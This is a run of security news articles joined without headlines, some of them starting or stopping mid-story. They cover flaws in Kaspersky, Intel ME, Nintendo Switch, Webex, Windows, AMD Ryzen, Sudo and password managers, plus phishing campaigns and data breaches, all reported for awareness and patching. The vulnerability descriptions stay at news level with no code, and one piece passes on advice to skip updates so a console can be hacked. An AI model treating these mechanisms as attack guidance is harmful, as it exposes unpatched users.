However, unlike the iOS version, the Android variant doesn’t actually exploit any unknown vulnerabilities.
Instead, it taps known flaws in older Android versions.
Chrysaor was never available on Google Play, and the small number of infected devices found suggests that most users will never encounter it, the search giant said.

Using an SSL proxy that simplistically stored certificates, Kaspersky Anti-Virus left its users open to TLS certificate collisions.
By Chris Duckett
Google's Project Zero has found that it was previously trivial to create an SSL certificate collision thanks to Kaspersky using only the first 32 bits of an MD5 hash in its SSL proxy packaged with its Anti-Virus product.
""You don't have to be a cryptographer to understand a 32-bit key is not enough to prevent brute-forcing a collision in seconds,"" Tavis Ormandy of Project Zero said in its issue tracker.
""They effectively proxy SSL connections, inserting their own certificate as a trusted authority in the system store and then replace all leaf certificates on the fly.
This is why if you examine a certificate when using Kaspersky Anti-Virus, the issuer appears to be 'Kaspersky Anti-Virus Personal Root',"" he said.
""It seems incredible that Kaspersky haven't noticed that they sometimes get certificate errors for mismatching commonNames just by random chance.
After Ormandy reported the bug and received acknowledgement from Kaspersky on November 1, despite learning the security vendor was doing some commonName checks, the bug was still able to be exploited.
""If you're not being attacked, you would see random errors.
A MITM [man in the middle] can send you packets from where you were expecting,"" Ormandy said on Twitter.
Ormandy also found another bug on November 12 that allowed any unprivileged user to become a local certificate authority.
In May last year, the Project Zero security researcher discovered that Symantec Antivirus Engine was vulnerable to buffer overflow when parsing malformed portable-executable header files that resulted in instant blue-screening and kernel memory corruption without user action on Windows.
""This is about as bad as it can possibly get,"" Ormandy said at the time.
Because Symantec use a filter driver to intercept all system I/O, just emailing a file to a victim or sending them a link is enough to exploit it.""

It was starting to feel like Intel was overdue for serious Management Engine (ME) vulnerabilities. But this week, researchers at Positive Technologies revealed a new security flaw in the subsystem that could let attackers compromise its MFS file system. Intel has released updates to address the problem, though, so Intel CPU owners should make sure their firmware is up-to-date.
ME has become a repeated source of problems for Intel and its customers. The utility is a chip-on-a-chip that allows IT managers to remotely access company PCs with tools like Intel's Active Management Technology (AMT). ME has its own network interface, memory, operating system and file system (MFS) that are kept separate from the main system in a bid to prevent it from allowing hackers to access ostensibly secure information.
The problem is that researchers have discovered numerous vulnerabilities in ME over the last few years; Positive Technologies revealed one in 2017 that allowed full takeover of ME via USB (it's since been fixed). Now, it's revealed another one that allows someone with physical access to a system to compromise ME and ""manipulate the state of MFS and extract important secrets"" with the ability to ""add files, delete files and change their protection attributes.""
Positive Technologies said the attack can be used to learn four keys MFS uses to secure data-- the Intel Integrity Key, Non-Intel Integrity Key, Intel Confidentiality Key and Non-Intel Confidentiality Key--that were supposed to be protected via a firmware update Intel released in 2017. Positive Technologies explained how someone with physical access to the system could bypass that patch to compromise those keys in its blog post:
""Positive Technologies expert Dmitry Sklyarov discovered vulnerability CVE-2018-3655, described in advisory Intel-SA-00125. He found that Non-Intel Keys are derived from two values: the SVN and the immutable non-Intel root secret, which is unique to each platform. By using an earlier vulnerability to enable the JTAG debugger, it was possible to obtain the latter value. Knowing the immutable root secret enables calculating the values of both Non-Intel Keys even in the newer firmware version. ... Attackers could calculate the Non-Intel Integrity Key and Non-Intel Confidentiality Key for firmware that has the updated SVN value and therefore compromise the MFS security mechanisms that rely on these keys.""
Intel released the Intel-SA-00125 firmware update to defend against this vulnerability on September 11. But this is another point in favor of companies questioning--or outright banning--the use of ME in their systems. Purism avoids ME and the services it enables in its privacy-focused Librem notebooks, Google is working to remove ME from the Intel processors it uses and previous security flaws have raised concerns among consumers.

THAT UN-PATCHABLE FLAW in the Nintendo Switch? Yeah, the Japanese gaming firm has only gone and fixed it, according to console hacker Michael.
Michael, who goes by the Twitter handle @SciresM, tweeted that it's bad news for console hackers and Nintendo is pushing out new console models with a fix that stops tech-savvy folks from messing around with the software that the hybrid games console can boot with.
The flaw was thought to be un-patchable as it affected the Nvidia Tegra X1 chip that sits at the heart of the console.
But Nintendo hates piracy more than most games firms, and as such, will release new versions of the Switch that don't have the silicon-level flaw in them. The patch involves using a system called  ‘iPatches' which updates parts of the code applying to the Tegra X1's fuses which plugs the boot hacking exploit. 
Current consoles out in the wild will still be vulnerable due to the patch needing to be applied at a hardware level, but new models won't be susceptible to the hack. 
But there's a bit of an odd situation here, as the new consoles will come running 4.1.0 versions of the Switch firmware; the latest Switch firmware is 5.1.0. So while the new Switchers will come off the production line immune to the Tegra X1 exploit, they will still be vulnerable to other hacking techniques. 
With this in mind, Michael advises that people keen to crack into their Switch consoles should not apply any updates, as the older version of the console's firmware is the easier it's to hack.
So while the un-patchable flaw may have been fixed the current iteration of the Switch is still no un-hackable.
Not that hacking the Switch is a good idea if you want to run pirated games, as Nintendo takes a very dim view of that and cracks down so hard on pirates that it'll permanently ban any console caught with bootlegged software from its online network.
With The Legend of Zelda: Breath of the Wild and Mario Odyssey alone there are tens of hours of gaming to be had on the Switch. let along all the stuff that's incoming and the suite of indie titles the console supports.
So if you desperately need to hack the Switch to play more games, perhaps it's time to take a break from gaming and go out into the sun; we hear the UK is lovely at the moment.

Cisco has patched a set of severe vulnerabilities which could lead to remote code execution in the Cisco Webex Network Recording Player for Advanced Recording Format (ARF).
The security flaws, CVE-2018-15414, CVE-2018-15421, and CVE-2018-15422, have been issued a base score of 7.8.
According to the Cisco Product Security Incident Response Team (PSIRT), the flaws could lead to ""an unauthenticated, remote attacker to execute arbitrary code on a targeted system.""
The Cisco Webex Network Recording Player for Advanced Recording Format (ARF), available for Windows, Mac, and Linux machines is a component for recording meetings taking place in the Cisco Webex Meetings Suite sites, Cisco Webex Meetings Online sites, and Cisco Webex Meetings Server.
In a security advisory posted this week, Cisco says that the following software is affected:
    Cisco Webex Meetings Suite (WBS32): Webex Network Recording Player versions prior to WBS32.15.10;
    Cisco Webex Meetings Suite (WBS33): Webex Network Recording Player versions prior to WBS33.3;
    Cisco Webex Meetings Online: Webex Network Recording Player versions prior to 1.3.37;
    Cisco Webex Meetings Server: Webex Network Recording Player versions prior to 3.0MR2.

According to Cisco, each operating system is vulnerable to at least one of the security flaws.
The vulnerabilities are due to the improper invalidation of Webex recording files. If a victim opens a crafted, malicious file in the Cisco Webex Player -- potentially sent over email as part of a spear phishing campaign -- the bugs are triggered, leading to exploit.
TechRepublic: Cisco switch flaw led to attacks on critical infrastructure in several countries
There are no workarounds to address these vulnerabilities. However, Cisco has developed patches to automatically update vulnerable software.
It is recommended that users accept these updates as quickly as possible. The tech giant notes that some Cisco Webex Meetings builds might be at the end of their support cycles and won't receive these updates. In these cases, users should contact the company directly.

Alternatively, the ARF component is an add-on and can simply be uninstalled manually. A removal tool is has been made available.
Cisco is not aware of any reports of any active exploits in the wild.
Steven Seeley from Source Incite and Ziad Badawi, working together with the Trend Micro Zero Day Initiative, have been credited with finding and reporting the bugs.
In related news this week, Trend Micro's Zero Day Initiative disclosed a Microsoft Jet zero-day vulnerability which was unpatched at the point of public disclosure. If exploited, the vulnerability permits attackers to remotely execute code on infected machines.

The shadowy hacker consortium known as Callisto Group targeted the UK's Foreign Office over several months in 2016.
According to research firm F-Secure, Callisto Group is an advanced threat actor whose known targets include military personnel, government officials, think tanks and journalists, especially in Europe and the South Caucasus. Their primary interest appears to be gathering intelligence related to foreign and security policy in the Eastern Europe and South Caucasus regions, and this, combined with infrastructure footprint links to known state actors, suggests a nation-state benefactor, the firm said.
In October 2015 the Callisto Group targeted a handful of individuals with phishing emails that attempted to obtain the target’s webmail credentials. Then, in early 2016, the Callisto Group began sending highly targeted spear phishing emails with malicious attachments that contained, as their final payload, the “Scout” malware tool from the HackingTeam RCS Galileo platform. Scout was, ironically, originally developed for law enforcement.
“These spear-phishing emails were crafted to appear highly convincing, including being sent from legitimate email accounts suspected to have been previously compromised by the Callisto Group via credential phishing,” F-Secure noted in a paper, adding that the group is continuing to set up new phishing infrastructure every week.
One of the targets for Callisto in 2016 was the Foreign Office, according to BBC sources. The outlet reports that the government is investigating an attack that began in April last year. A source told the BBC that the compromised server didn’t contain the most sensitive information, fortunately.
In a statement, the UK's National Cyber Security Centre (NCSC) declined attribution or comment and merely said: ""The first duty of government is to safeguard the nation and as the technical authority on cybersecurity, the NCSC is delivering ground breaking innovations to make the UK the toughest online target in the world. The government's Active Cyber Defence programme is developing services to block, prevent and neutralise attacks before they reach inboxes.”
F-Secure also said that evidence suggests the Callisto Group may have a nation-state sponsor, and that it uses infrastructure tied to China, Russia and Ukraine. It told the BBC that Callisto Group's hacking efforts show similarities in tactics, techniques, procedures and targets to the Russia-linked group known as APT28, though the two appear to be different entities.
However, Callisto Group is also associated with infrastructure used for the sale of controlled substances, which “hints at the involvement of a criminal element,” F-Secure said.
Going a bit further, a different source told the BBC that two of the phishing domains used in the UK attack “were once linked to an IP address mentioned in a US government report into Grizzly Steppe.”
Grizzly Steppe is the code-name for Russian meddling in the US elections.

With phishing now widely used as a mechanism for distributing ransomware, a new NTT Security reveals that 77% of all detected ransomware globally was in four main sectors – business & professional services (28%), government (19%), health care (15%) and retail (15%).
While technical attacks on the newest vulnerabilities tend to dominate the media, many attacks rely on less technical means. According to the GTIR, phishing attacks were responsible for nearly three-quarters (73%) of all malware delivered to organizations, with government (65%) and business & professional services (25%) as the industry sectors most likely to be attacked at a global level. When it comes to attacks by country, the U.S.(41%), Netherlands (38%) and France (5%) were the top three sources of phishing attacks.
The report also reveals that just 25 passwords accounted for nearly 33% of all authentication attempts against NTT Security honeypots last year. Over 76% of log on attempts included a password known to be implemented in the Mirai botnet – a botnet comprised of IoT devices, which was used to conduct, what were at the time, the largest ever distributed denial of service (DDoS) attacks. 
DDoS attacks represented less than 6% of attacks globally, but accounted for over 16% of all attacks from Asia and 23% of all attacks from Australia.
Finance was the most commonly attacked industry globally, subject to 14% of all attacks. The finance sector was the only sector to appear in the top three across all of the geographic regions analysed, while manufacturing appeared in the top three in five of the six regions. Finance (14%), government (14%) and manufacturing (13%) were the top three most commonly attacked industry sectors. 
“We identified more than six billion attempted attacks over the 12-month period – that’s around 16 million attacks a day – and monitored threat actors using nearly every type of attack,” said Steven Bullitt, Vice President Threat Intelligence & Incident Response, GTIC, NTT Security.
With visibility into 40 percent of the world’s internet traffic, NTT Security summarizes data from over 3.5 trillion logs and 6.2 billion attacks for the 2017 Global Threat Intelligence Report (GTIR). Analysis is based on log, event, attack, incident and vulnerability data.

Microsoft this week released software updates to fix roughly 50 security problems with various versions of its Windows operating system and related software, including one flaw that is already being exploited and another for which exploit code is publicly available.
The zero-day bug — CVE-2018-8453 — affects Windows versions 7, 8.1, 10 and Server 2008, 2012, 2016 and 2019. According to security firm Ivanti, an attacker first needs to log into the operating system, but then can exploit this vulnerability to gain administrator privileges.
Another vulnerability patched on Tuesday — CVE-2018-8423 — was publicly disclosed last month along with sample exploit code. This flaw involves a component shipped on all Windows machines and used by a number of programs, and could be exploited by getting a user to open a specially-crafted file — such as a booby-trapped Microsoft Office document.
KrebsOnSecurity has frequently suggested that Windows users wait a day or two after Microsoft releases monthly security updates before installing the fixes, with the rationale that occasionally buggy patches can cause serious headaches for users who install them before all the kinks are worked out.
This month, Microsoft briefly paused updates for Windows 10 users after many users reported losing all of the files in their “My Documents” folder. The worst part? Rolling back to previous saved versions of Windows prior to the update did not restore the files.
Microsoft appears to have since fixed the issue, but these kinds of incidents illustrate the value of not only waiting a day or two to install updates but also manually backing up your data prior to installing patches (i.e., not just simply counting on Microsoft’s System Restore feature to save the day should things go haywire).
Mercifully, Adobe has spared us an update this month for its Flash Player software, although it has shipped a non-security update for Flash.

 On Friday, the hacker group known as The Shadow Brokers released a trove of Windows exploits. But Microsoft says it has already issued patches for the majority of attacks, and the most recent fix came last month.
 ""Most of the exploits that were disclosed fall into vulnerabilities that are already patched in our supported products,"" a blog post published Friday night by Microsoft reads.
 Broadly, the exploits could have allowed a hacker to compromise affected computers on a variety of Windows versions.
 For example, the ERRATICGOPHER attack was addressed prior to the release of Windows Vista, and ETERNALCHAMPION was fixed with two other previously disclosed vulnerabilities, according to the blog post.
 ETERNALBLUE, ETERNALROMANCE, and ETERNALSYNERGY were all patched on March 14, according to a Microsoft Security Bulletin. 
 Microsoft did not patch three other exploits, ENGLISHMANDENTIST, ESTEEMAUDIT, and EXPLODINGCAN, ostensibly because the attacks could not be reproduced on supported systems—that is, modern versions of Windows that Microsoft still issues updates for. Microsoft says customers using Windows 7 or above are not at risk.
 ""Customers still running prior versions of these products are encouraged to upgrade to a supported offering,"" the Microsoft blog post added.
 Interestingly before the March 14 patch, vulnerabilities related to several ETERNAL exploits also affected Windows 10, according to the Microsoft Security Bulletin. But, again, a fully up to date copy of Windows 10 will not be vulnerable.
 Originally, it was believed that many of these exploits were so-called zero-days; exploits that took advantage of vulnerabilities that Microsoft was not aware of. Security researchers verified that many of the exploits did work against Windows systems.
 However, it turns out that at least one of the researchers did not test the exploits against a fully up to date Windows machine, and crucially, not on one that included the March 14 patch.
 Matthew Hickey, otherwise known as Hacker Fantastic and the co-founder of British cybersecurity firm Hacker House, told Motherboard on Saturday he had used a ""clean install"" of Windows to test the attacks. Meaning that the machine didn't include the latest security fixes, and led to erroneous results.
It's pretty much always a good idea to keep your computer's operating system fully up to date, especially when news of critical security issues comes to light.

Google disclosed a flaw in Microsoft Edge earlier this week, after Microsoft failed to patch the bug in time. Now Google’s Project Zero team of security researchers are disclosing yet another Windows 10 security flaw that Microsoft has again failed to patch before Google’s imposed 90-day period. Neowin spotted that Google reported two bugs to Microsoft in November, but the company only addressed one of them with its recent Patch Tuesday fixes.
The latest unpatched issue is an Elevation of Privilege which allows a normal user to gain administrator privileges on a system. Microsoft has rated the flaw as “important,” but not “critical” as it can’t be exploited remotely. It’s still an important issue to fix, as an attacker could potentially combine this with a separate unknown remote code execution to gain administrator access, although that’s an unlikely scenario unless Microsoft doesn’t address it promptly.
It’s not clear when Microsoft intends to address the latest security flaw in Windows 10, and the company still needs to solve the Edge vulnerability that was disclosed by Google earlier this week. Microsoft hit back at Google’s approach to security patches last year, after discovering a Chrome flaw and “responsibly” disclosed it to Google so the company had enough time to patch.
Google’s policy to disclose after 90 days without a patch is often criticized and applauded in equal measure. There’s plenty of evidence to suggest security vulnerabilities are increasing in Windows and across the industry, and Microsoft has clearly struggled to fix these two issues with plenty of notice. It can also be argued that Google is making rival software more secure with its efforts, making everyone’s software secure. However, Google also has competitive commercial interests, and Project Zero has been unusually aggressive in finding and publishing new vulnerabilities.
Reports suggest Google’s Project Zero security team originated from the fallout around the 2009 Google hack, an intrusion blamed on an unpatched flaw in Microsoft’s Internet Explorer 6 browser.
Google makes exceptions to its strict rules, with grace periods, and can even disclose much sooner if the vulnerability is being actively exploited. Google disclosed a major Windows bug back in 2016 just 10 days after reporting it to Microsoft, and the company has revealed zero-day bugs in Windows in the past before patches are available.

AMD has acknowledged the Ryzenfall vulnerabilities discovered by CTS-Labs, though the chip company believes the flaws can be patched via BIOS updates issued over the next few weeks.
In a blog post authored by AMD’s chief technical officer, Mark Papermaster, AMD confirmed that the four broad classifications of attacks—Masterkey, Ryzenfall, Fallout, and Chimera—are viable, though they require administrative access to the PC or server in question. Third-party protection, such as Microsoft Windows Credential Guard, also serve to block unauthorized administrative access, Papermaster wrote.
In any event, “any attacker gaining unauthorized administrative access would have a wide range of attacks at their disposal well beyond the exploits identified in this research,” AMD’s Papermaster added.
But AMD also provided the answer to consumers’ most pressing question: What, if anything, needs to be done? For each of the first three classifications of vulnerabilities, AMD said it is working on firmware updates that the company plans to release during the coming weeks.
The fourth category of vulnerability, known as Chimera, affected the Promontory chipset, which CTS-Labs said was designed with logic supplied by ASMedia, a third-party vendor. While AMD said patches for that will also be released via a BIOS update, the company said it is working with the Promontory chipset maker on developing the mitigations, rather than supplying its own.
AMD has neither confirmed nor denied whether the attacks can be executed remotely, or require local access. AMD did deny, however, that the attacks have anything to do with Meltdown or Spectre, the two side-channel attacks that rival Intel has worked to patch.
About a week ago, CTS-Labs issued a press release as well as a website outlining the vulnerabilities, which the company provided to AMD less than 24 hours before CTS-Labs went public, AMD said. But CTS-Labs also drew fire over boilerplate copy on its website that implied a potential financial interest in the subjects of its reports. PCWorld attempted to interview CTS executives, but later rescinded that request after CTS-Labs representatives demanded a list of questions in advance, and also forbade us from asking about the timing and the company’s financial motivations.
In the meantime, however, the vulnerabilities were confirmed by two independent researchers, Trail of Bits and Check Point. Both expressed doubts that attackers would be able to exploit the vulnerabilities that CTS-Labs had originally discovered.

Remember when the sky--or at least Ryzen--was falling? You should, because it was only a few months ago, when the CTS Labs security company revealed numerous vulnerabilities in AMD's new Ryzen and EPYC processor lines. AMD has been largely quiet about these vulnerabilities in the time since, but the company assured Tom's Hardware that it hasn't forgotten about CTS Labs' report or neglected to address the flaws in its processors.
A quick recap: In March, CTS Labs released information on a collection of vulnerabilities in AMD's latest chips that it dubbed ""Ryzenfall."" These security flaws were said to be present in the most basic aspects of the Ryzen and EPYC processors, and after consulting with other researchers, CTS Labs decided to publish its findings without giving AMD the customary 90-day notice between a vulnerability's discovery and its public disclosure.
Earlier this week, CTS Labs emailed us to express concern about the lack of updates from AMD regarding these vulnerabilities. The company said it believed many of the vulnerabilities would take months to fix, with the Chimera issues requiring a hardware change that couldn't be implemented in products that have already shipped. AMD's relative silence and lack of updates apparently led CTS Labs to believe the company had stalled out.

We reached out to AMD for comment and received the following in response:
Within approximately 30 days of being notified by CTS Labs, AMD released patches to our ecosystem partners mitigating all of the CTS identified vulnerabilities on our EPYC™ platform as well as patches mitigating Chimera across all AMD platforms. These patches are in final testing with our ecosystem partners in advance of being released publicly.  We remain on track to begin releasing patches to our ecosystem partners for the other products identified in the report this month.  We expect these patches to be released publicly as our ecosystem partners complete their validation work.

That's still vague--we don't know to what ""ecosystem partners"" these patches have been delivered nor when they should be expected to roll out--but it does show that AMD hasn't simply forgotten about CTS Labs' report. We expect to hear more about these patches and how AMD plans to address them as the company and its partners get them ready to ship. In the meantime, it seems that much like the sky, Ryzen has yet to fall.

Science Inc., the company behind the popular online poll creation app Wishbone, has suffered a data breach.
As a consequence, personal and account information of over 2.2 million of the app’s users is being circulated on underground forums.
The compromised records include names, usernames, email addresses and telephone numbers of the users, but also their gender and birth date (if they chose to share that info when they set up the account).
According to Troy Hunt, who received a copy of the compromised MongoDB database, 2,326,452 full names, 2,247,314 unique email addresses, and 287,502 cellphone numbers were included.
Most importantly, the great majority of Wishbone users are teenagers and young adults, and predominantly female.
“I’d be worried about the potential for kids to abuse the data,” Hunt told Motherboard.
“There’s a lot of young people in there and finding, say, young females and being able to contact them by phone is a worry”.
Not only that, but the data could be used to ferret out additional information about these persons, either via phishing or by searching the Internet for unsecured social media accounts that can be tied to them.
Armed with all this information, fraudsters could easily perpetrate identity theft schemes.
And perhaps the stolen data has already been misused.
Hunt say that the data breach dates back to August 2016, but according to the notification letter the Wishbone team sent out, they “became aware that unknown individuals may have had access to an API without authorization and were able to obtain account information of its users” only on March 14, 2017.
Since then, they “rectified” the vulnerability that allowed the information to be slurped by the attackers, and are now advising users to consider changing their passwords (even though they have not been compromised in the incident).

The technical details of security vulnerabilities impacting the Nvidia Video and an Android driver have been revealed by Zimperium, which acquired the flaws as part of an exploit acquisition program.
On Tuesday, Zimperium zLabs researchers published a blog post detailing the security flaws, two escalation of privilege bugs found within the NVIDIA Video driver and MSM Thermal driver.
The Nvidia bug, CVE-2016-2435, impacts Android 6.0 on the Nexus 9 handset. The problem arises when attackers craft an application to tamper with read/write memory values and force privilege escalation.
The second security flaw, CVE-2016-2411, involves a Qualcomm power management kernel driver, the MSM Thermal driver, in Android version 6. If an attacker crafts a malicious application, they can give themselves root access through an internal bug in the driver, leading to privilege escalation.
These bugs are well documented, known, and for the most part security updates have been issued. However, Zimperium says that making the technical details available of these so-called ""N-day"" flaws is important and can act as a catalyst to boost the speed of patch production and to iron out problems arriving between a patch being created and vendors distributing the update in good time.
In February, Zimperium launched an N-day acquisition program which is only interested in known security problems, rather than unknown and unpatched zero-days. Over the next year, the exploit purchaser is budgeting a total of $1.5 million to pick up the details on these exploits.
Once a bug has been discovered and a fix is being worked on, an N-day exploit indicates a time of one or more days in which user systems can be compromised until a security update is issued.
""By focusing on N-days, or patched vulnerabilities, Zimperium is applying pressure on the mobile ecosystem to re-think how and when users receive security updates,"" the company said at the time. ""[The] program will reward the hard work of researchers who wouldn't otherwise receive compensation for an N-day exploit.""

As part of its monthly Update Tuesday, Microsoft announced this week that they’ve released a preliminary fix for a vulnerability rated important, and present in all supported versions of Windows in circulation (basically any client or server version of Windows from 2008 onward).
The flaw affects the Credential Security Support Provider (CredSSP) protocol, which is used in all instances of Windows’ Remote Desktop Protocol (RDP) and Remote Management (WinRM).
The vulnerability, CVE-2018-0886, could allow remote code execution via a physical or wifi-based Man-in-the-Middle attack, where the attacker steals session data, including local user credentials, during the CredSSP authentication process.
Although Microsoft says the bug has not yet been exploited, it could cause serious damage if left unpatched.
RDP is widely used in enterprise environments and an attacker who successfully exploits this bug could use it to gain a foothold from which to pivot and escalate. It’s also popular with small businesses who outsource their IT administration and, needless to say, an attacker with an admin account has all the aces.
Security researchers at Preempt say they discovered and disclosed this vulnerability to Microsoft last August, and Microsoft has been working since then to create the patch released this week.
Now it’s out there, it’s a race against time to make sure you aren’t an easy target for an attacker who wants to try and kick the tires on this vulnerability.
Obviously, patch as soon as possible and please follow Microsoft’s guidance carefully:
    Mitigation consists of installing the update on all eligible client and server operating systems and then using included Group Policy settings or registry-based equivalents to manage the setting options on the client and server computers. We recommend that administrators apply the policy and set it to “Force updated clients” or “Mitigated” on client and server computers as soon as possible.  These changes will require a reboot of the affected systems.
    Pay close attention to Group Policy or registry settings pairs that result in “Blocked” interactions between clients and servers in the compatibility table later in this article.
Both the “Force updated clients” and “Mitigated” settings prevent RDP clients from falling back to insecure versions of CredSSP. The “Force updated clients” setting will not allow services that use CredSSP to accept unpatched clients but “Mitigated” will.

Microsoft's patches for the Meltdown vulnerability have had a fatal flaw all these past months, according to Alex Ionescu, a security researcher with cyber-security firm Crowdstrike.
Only patches for Windows 10 versions were affected, the researcher wrote today in a tweet. Microsoft quietly fixed the issue on Windows 10 Redstone 4 (v1803), also known as the April 2018 Update, released on Monday.
""Welp, it turns out the Meltdown patches for Windows 10 had a fatal flaw: calling NtCallEnclave returned back to user space with the full kernel page table directory, completely undermining the mitigation,"" Ionescu wrote.

Microsoft issued today an security update, but it wasn't to backport the ""fixed"" Meltdown patches for older Windows 10 versions.
Instead, the emergency update fixed a vulnerability in the Windows Host Compute Service Shim (hcsshim) library (CVE-2018-8115) that allows an attacker to remotely execute code on vulnerable systems. Microsoft classified CVE-2018-8115 as a ""critical"" issues. A patched hcsshim file is available for download from GitHub.

""We are aware and are working to provide customers with an update,"" a Microsoft spokesperson told Bleeping Computer today in an email.
It may be that if Microsoft doesn't bundle these fixes in an out-of-band update, they will most likely arrive in Microsoft's May 2018 Patch Tuesday, but this is only our speculation.
Microsoft released its Meltdown and Spectre patches on January 4, a day after security researchers disclosed the two flaws, vulnerabilities that allow attackers to retrieve data from protected areas of modern CPUs.
The Redmond-based OS maker has had a hard time patching the two flaws, and the company recently issued additional security updates to fix the original Spectre mitigations, and also deliver Intel CPU microcode updates, as a favor to Intel.

Users of the Guardian’s Soulmates dating site have been getting spammed with smut after the site leaked their contact information.
The UK-based Guardian newspaper’s publisher, which runs the service, is blaming “human error” and a third-party technology provider for the leak, which has now been fixed. According to the BBC, the site — which charges users up to £32 ($41.50) per month — said that only email addresses and user IDs had been exposed directly. But that information can be used to dig out more from public profiles, said the company, including photos, relationship preferences and physical descriptions.
Here’s a statement the publisher sent to The Register:
    We can confirm we have received 27 enquiries from our members which show evidence of their email addresses used for their Soulmates account having been exposed.
    We take matters of data security extremely seriously and have conducted thorough audits of all our internal systems and are confident that no outside party breached any of these systems. Our ongoing investigations point to a human error by one of our third party technology providers, which led to an exposure of an extract of data. This extract contained only members’ email addresses and user ID which can be used to find members’ publicly available online profiles.
    We have taken appropriate measures to ensure this does not happen again, and we continue to review our processes and third party suppliers.
    Nonetheless, we apologise to our members who were affected. If any of our members are concerned we encourage them to contact us on support@guardiansoulmates.com.
One user who contacted the BBC said they’d starting receiving sexually explicit spam, laced with information from their Soulmates profile, in November.
The user, who works in IT, said they weren’t completely surprised. Things like this can happen with online services. But they were still a bit taken aback, given that they hadn’t used the site for several years and they were no longer paying the membership fee.
That user told the BBC that they had contacted Soulmates six months ago, concerned about what other information might have been breached.
Another user who reached out to the BBC said that in spite of the breached information being public, it still felt “creepy” to see it lifted from the confines of the dating site:
    It’s all information that I was happy to put online at one point anyway, but when it’s used outside of context like that it does feel a lot more creepy.
We don’t have details on the identity of the third-party tech provider, or where, exactly, in the setup the door was left open. At any rate, if it is indeed the fault of a third party, this is just the latest example of how contractors can be the weak link in your security chain.
It doesn’t matter how strict your own cybersecurity is if one of your contractors isn’t up to scratch. As we’ve noted before, everyone we do business with, share data with, outsource operations to, sell things to or buy things from forms a part of our own security chain. A breach at any point in the chain can have an impact on the privacy and integrity of our data.
As for those Soulmates users now afflicted with sexually explicit spam, our sympathies. It’s hard enough to find true love. Who needs the heartache of trying, and failing, to keep your data out of the hands of e-jerks?
We’ve passed out plenty of advice to avoid online dating fraud, but none of that applies here, given that you’re certainly not at fault in this one.
Do be careful of that spam, though. Be it lascivious or as pure as a spring lamb, it’s still spam, and that stuff often goes hand in hand with malware. Don’t click!

Criminals are attempting to trick consumers into handing over passwords and credit card details by taking advantage of the flood of emails being sent out ahead of new European privacy legislation.
The European Union's new General Data Protection Regulation (GDPR) come into force on 25 May and the policy is designed to give consumers more control over their online data. As a result, in the run-up to it, organisations are sending out messages to customers to gain their consent for remaining on their mailing lists.
With so many of these messages being sent out, it was perhaps only a matter of time before opportunistic cybercriminals looked to take advantage of the deluge of messages about GDPR and privacy policies arriving in people's inboxes.
A GDPR-related phishing scam uncovered by researchers at cyber security firm Redscan is doing just this in an effort to steal data with emails claiming to be from Airbnb. The attackers appear to be targeting business email addresses, which suggests the messages are sent to emails scraped from the web.
The phishing message addresses the user as an Airbnb host and claims they're not able to accept new bookings or send messages to prospective guests until a new privacy policy is accepted. 
""This update is mandatory because of the new changes in the EU Digital privacy legislation that acts upon United States based companies, like Airbnb in order to protect European citizens and companies,"" the message says, and the recipient is urged to click a link to accept the new privacy policy.
 Those who click the link are asked to enter their personal information, including account credentials and payment card information. If the user enters these, they're handing the data straight into the hands of criminals who can use it for theft, identity fraud, selling on the dark web and more.
""The irony won't be lost on anyone that cybercriminals are exploiting the arrival of new data protection regulations to steal people's data,"" said Mark Nicholls, Director of Cyber Security at Redscan.
""Scammers know that people are expecting exactly these kinds of emails this month and that they are required to take action, whether that's clicking a link or divulging personal data. It's a textbook phishing campaign in terms of opportunistic timing and having a believable call to action"".
Airbnb is sending messages to users about GDPR, but the messages contain far more detail and don't ask the users to enter any credentials, merely agree to the new Terms of Service.
While the phishing messages might look legitimate at first glance, it's worth noting they don't use the right domain - the fake messages come from '@mail.airbnb.work' as opposed to '@airbnb.com'.
Redscan has warned that attackers are likely to use GDPR as bait for other phishing scams, with messages claiming to be from other well-known companies.
""As we get closer to the GDPR implementation deadline, I think we can expect to see a lot a lot more of these types of phishing scams over the next few weeks, that's for sure,"" said Nicholls, who warned attackers could attempt to use the ploy to deliver malware in future.
""In the case of the Airbnb scam email, hackers were attempting to harvest credentials. Attack vectors do vary however and it's possible that other attacks may attempt to infect hosts with keyloggers or ransomware, for example."" he said.
Airbnb said those behind the attacks haven't accessed user details in order to send emails and that users who receive a suspicious message claiming to be from Airbnb should send it to their safety team.
""These emails are a brazen attempt at using our trusted brand to try and steal user's details, and have nothing to do with Airbnb. We'd encourage anyone who has received a suspicious looking email to report it to our Trust and Safety team on report.phishing@airbnb.com, who will fully investigate,"" an Airbnb spokesperson told ZDNet.
Airbnb also provided information on how to spot a fake email to help users to determine if a message is genuine or not.

The list of tested apps includes MyPasswords,  Informaticore, LastPass, Keeper, F-Secure Key, Dashlane, Hide Pictures Keep Safe Vault, Avast Passwords, and 1Password.
All tested apps were installed on at least 500,000 devices, with some apps having millions of users.
The research team says these apps featured different kinds of security flaws, listed below:
""The overall results were extremely worrying and revealed that password manager applications, despite their claims, do not provide enough protection mechanisms for the stored passwords and credentials,"" the research team concluded.
""Instead, they abuse the users' confidence and expose them to high risks.""
In total, security researchers found 26 security bugs, ranging from low to critical-level issues.
The research team went public with their findings at the start of the week.
Initially, app makers fixed 23 of the 26 flaws, with Avast still lagging behind on three issues.
Nevertheless, by March 1, Avast had also patched its product, and now users can update to the applications' latest versions to mitigate all issues discovered during the research.
The research team's name is TeamSIK (Security Is Key), made up of several security professionals from the Fraunhofer Institute for Secure Information Technology in Darmstadt, Germany.
Vulnerability reports for most of the found issues are available on TeamSIK's project homepage.

Security researchers at Qualys Security have discovered a Linux flaw that could be exploited to gain root privileges and overwrite any file on the filesystem on SELinux-enabled systems.
The high severity flaw, tracked as CVE-2017-1000367, resides in the Sudo’s get_process_ttyname() for Linux and is related to the way Sudo parses tty information from the process status file in the proc filesystem.
The Linux flaw could be exploited by a local user with privileges to execute commands via Sudo and could allow attackers to escalate their privileges to root.
The Sudo’s get_process_ttyname() function opens “/proc/[pid]/stat” (man proc) and reads the device number of the tty from field 7 (tty_nr). These fields are space-separated, the field 2 (comm, the filename of the command) can contain spaces.
Sudoer users on SELinux-enabled systems could escalate their privileges to overwrite any file on the filesystem with their command’s output, including root-owned files.
“We discovered a vulnerability in Sudo’s get_process_ttyname() for Linux: this function opens “/proc/[pid]/stat” (man proc) and reads the device number of the tty  from field 7 (tty_nr). Unfortunately, these fields are space-separated and field 2 (comm, the filename of the command) can contain spaces (CVE-2017-1000367).” reads the security advisory. “On an SELinux-enabled system, if a user is Sudoer for a command that does not grant him full root privileges, he can overwrite any file on
the filesystem (including root-owned files) with his command’s output,
